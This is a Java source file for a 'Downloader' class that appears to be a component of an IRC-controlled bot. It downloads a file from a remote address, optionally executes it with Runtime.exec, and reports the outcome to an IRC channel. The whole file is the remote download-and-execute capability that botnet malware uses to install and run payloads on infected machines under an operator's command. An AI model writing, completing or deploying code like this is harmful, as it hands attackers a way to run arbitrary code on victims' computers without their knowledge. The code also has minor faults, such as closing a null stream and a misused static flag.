import java.net.URL;
import java.net.URLConnection;
import java.io.*;
/**
 * Downloader class
 * @author Nathan
 *
 */
public class Downloader extends Thread {

	@SuppressWarnings("static-access")
	/**
	 * Constructor
	 */
	public Downloader(String url, String path, int execute) {
		this.url = url;
		this.path = path;
		this.execute = execute;
	}
	/**
	 * Downloads a file from a remote address and saves it to a specified location on the hosts computer
	 * @param address
	 * @param localFileName
	 * @return
	 * @throws Exception
	 */
	public static String download(String address, String localFileName) throws Exception {
		OutputStream out = null;
		URLConnection conn = null;
		InputStream  in = null;
		try {
			URL url = new URL(address);
			try {
			out = new BufferedOutputStream(
				new FileOutputStream(localFileName));
			} catch(Exception e) {
				IRC.sendMessage(Config.getChannel(), "Exception occourence" +
						", possible file not found or acsess denied!");
				out.close();
				return "Error while downloading!";
			}
			conn = url.openConnection();
			in = conn.getInputStream();
			byte[] buffer = new byte[1024];
			int numRead;
			long numWritten = 0;
			while ((numRead = in.read(buffer)) != -1) {
				out.write(buffer, 0, numRead);
				numWritten += numRead;
			}
		} catch (Exception exception) {
			exception.printStackTrace();
			return "Error while downloading file!";
		} finally {
			try {
				if(execute == 1) {
					Runtime rt = Runtime.getRuntime();
					rt.exec(localFileName);
				}
				if (in != null) {
					in.close();
				}
				if (out != null) {
					out.close();
				}
				return "File downloaded sucsessfully!";
			} catch (IOException ioe) {
			}
		}
		return "Unknown error!";
	}
	/**
	 * If no file name is given to save tries to work out the file name from the URL and saves it as that
	 * @param address
	 * @throws Exception
	 */
	public static void download(String address) throws Exception {
		int lastSlashIndex = address.lastIndexOf('/');
		if (lastSlashIndex >= 0 &&
		    lastSlashIndex < address.length() - 1) {
			download(address, address.substring(lastSlashIndex + 1));
		} else {
			IRC.sendMessage(Config.getChannel(), "Could not figure out local file name for " +
				address);
		}
	}
	/**
	 * Downloads the specified file on a new thread
	 */
	public void run() {
		try {
		IRC.sendMessage(Config.getChannel(), download(url, path));
		} catch (Exception e) {
			Misc.print("Exception occourence, possible file not found or acsess denied!");
			IRC.sendMessage(Config.getChannel(), "Exception occourence, possible file not found or acsess denied!");
		}
	}
	
	private String url;
	private String path;
	private static int execute;
}
